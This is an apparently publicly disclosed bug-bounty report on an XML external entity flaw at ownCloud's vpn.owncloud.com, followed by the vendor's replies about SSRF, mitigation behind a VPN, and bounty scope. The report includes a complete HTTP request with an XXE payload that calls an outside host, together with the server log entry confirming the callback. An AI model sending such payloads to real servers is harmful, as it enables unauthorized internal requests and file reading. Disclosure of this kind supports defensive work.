title: XXE at host vpn.owncloud.com

profile.name: ownCloud
profile.about: ownCloud GmbH is the company behind the ownCloud Project - the most downloaded open source project for data and file sync, share and view.

vulnerability_information: Improper XML parser configuration provide attacker to read arbitrary files and make HTTP requests from server side. Exploit example is listed below: ``` POST /user/login HTTP/1.1 Host: 144.76.105.208 Accept: */* Content-type: application/xml Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 163 %select; ]> wlrm-scnr ``` From access.log on this server: 2a01:4f8:192:50d6::2 - - [18/Dec/2015:21:11:47 +0300] "GET /ok HTTP/1.0" 200 227 "-" "-"
vulnerability_information_html:
Improper XML parser configuration provide attacker to read arbitrary files and make HTTP requests from server side.

Exploit example is listed below:

POST /user/login HTTP/1.1
Host: 144.76.105.208
Accept: */*
Content-type: application/xml
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 163

<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY % select SYSTEM "http://wallarm.tools/ok">
%select;
]>
<a>wlrm-scnr</a>

From access.log on this server:
2a01:4f8:192:50d6::2 - - [18/Dec/2015:21:11:47 +0300] "GET /ok HTTP/1.0" 200 227 "-" "-"

activities.message:
Thanks a lot for reporting this potential issue back to us. We take security very seriously and would appreciate if you would not share any information about this bug until we have determined a potential patch.
 
Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster.
activities.markdown_message:
Thanks a lot for reporting this potential issue back to us. We take security very seriously and would appreciate if you would not share any information about this bug until we have determined a potential patch.

Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster.

activities.message:
Thanks a lot for your report.

While a file extraction seems not to be possible using Out-Of-Band methods (if it is please let us know!) this is indeed unwanted behaviour. I'll see what we can do here.
activities.markdown_message:
Thanks a lot for your report.

While a file extraction seems not to be possible using Out-Of-Band methods (if it is please let us know!) this is indeed unwanted behaviour. I'll see what we can do here.

activities.message: It's still SSRF to intranet and localhost. I'll try to read files by OOB at next week.
activities.markdown_message: It's still SSRF to intranet and localhost. I'll try to read files by OOB at next week.

activities.message: Thanks a lot for your report. We have mitigated this issue by making the service only accessible via our trusted VPN. Could you confirm that the issue has been fixed?
activities.markdown_message: Thanks a lot for your report. We have mitigated this issue by making the service only accessible via our trusted VPN. Could you confirm that the issue has been fixed?

activities.message: As per our policy we're publicly disclosing all resolved reports. Thanks again for making the world a safer place :-)
activities.markdown_message: As per our policy we're publicly disclosing all resolved reports. Thanks again for making the world a safer place :-)

activities.message:
Please note that for the time being we do not award monetary rewards for bugs reported for our own website and infrastructure.

From our FAQ:
> **Q: Why do you exclude the ownCloud websites and infrastructure?**
> A: For the time being we want to focus our efforts on ownCloud Server instead of vulnerabilities within our website and infrastructure. However, if you find a security bug in our website or infrastructure we welcome any report, though we cannot offer a monetary incentive.

If you want to ensure that your submission are in-scope you might want to try the code available from https://owncloud.org/install/
activities.markdown_message:
Please note that for the time being we do not award monetary rewards for bugs reported for our own website and infrastructure.

From our FAQ:

Q: Why do you exclude the ownCloud websites and infrastructure?
A: For the time being we want to focus our efforts on ownCloud Server instead of vulnerabilities within our website and infrastructure. However, if you find a security bug in our website or infrastructure we welcome any report, though we cannot offer a monetary incentive.

If you want to ensure that your submission are in-scope you might want to try the code available from https://owncloud.org/install/

activities.message: We do research not for money. Just for testing our product to find real vulnerabilities.
